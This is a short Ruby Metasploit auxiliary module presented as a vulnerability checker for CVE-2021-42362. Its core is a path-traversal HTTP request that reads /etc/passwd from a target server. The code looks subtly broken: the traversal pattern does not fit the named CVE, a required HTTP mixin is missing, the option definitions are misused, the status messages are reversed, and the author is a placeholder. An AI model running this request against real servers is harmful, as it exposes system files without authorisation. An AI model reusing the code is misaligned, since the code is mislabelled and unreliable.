##
# This module tests if a server is vulnerable to the CVE-2021-42362 vulnerability.
#
# Reference:
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42362
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2021-42362 Vulnerability Checker',
      'Description'    => 'Checks if a server is vulnerable to the CVE-2021-42362 vulnerability.',
      'Author'         => ['Author Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2021-42362']
      ]
    ))

    register_options([
      Opt::RHOST('server-ip', 'The IP address of the server'),
      Opt::RPORT(80, 'The port to use for the connection')
    ])
  end

  def run
    begin
      print_status("Connecting to the server...")
      connect

      print_status("Sending request to check for CVE-2021-42362 vulnerability...")
      res = send_request_raw({
        'uri' => '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        'method' => 'GET'
      })

      if res and res.code == 200 and res.body.include?('root:x:0:0:')
        print_error("The server is vulnerable to the CVE-2021-42362 vulnerability.")
      else
        print_good("The server is not vulnerable to the CVE-2021-42362 vulnerability.")
      end

    rescue ::Rex::ConnectionError
      print_error("Could not connect to the server.")
    ensure
      disconnect
    end
  end

end
